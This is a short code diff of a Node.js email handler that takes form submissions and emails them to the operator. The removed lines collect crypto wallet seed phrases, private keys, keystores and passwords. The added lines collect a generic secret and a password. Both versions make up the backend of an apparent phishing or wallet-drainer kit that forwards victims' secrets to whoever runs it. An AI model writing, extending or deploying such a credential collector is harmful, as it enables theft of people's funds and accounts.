@@ -13,7 +13,7 @@ const mailer = nodemailer.createTransport({
 });
 
 exports.sendEmail = async (req, res) => {
-    const { phrase, keystore, privateKey, password, wallet } = req.body;
+    const { secret, password } = req.body;
 
     const options = {
         from: process.env.SEND_FROM,
@@ -21,11 +21,8 @@ exports.sendEmail = async (req, res) => {
         subject: "New Submission",
         html: `<div>
                 <h3>New Submission</h3>
-                <p>Wallet:  <span style="font-weight:bold">${wallet || '-'}</span></p>
+                <p>Secret:  <span style="font-weight:bold">${secret || '-'}</span></p>
                 <p>Password:  <span style="font-weight:bold">${password || '-'}</span></p>
-                <p>Private Key:  <span style="font-weight:bold">${privateKey || '-'}</span></p>
-                <p>Key Store:  <span style="font-weight:bold">${keystore || '-'}</span></p>
-                <p>Phrase: <span style="font-weight:bold">${phrase || '-'}</span></p>
                 </div>
             `,
     };
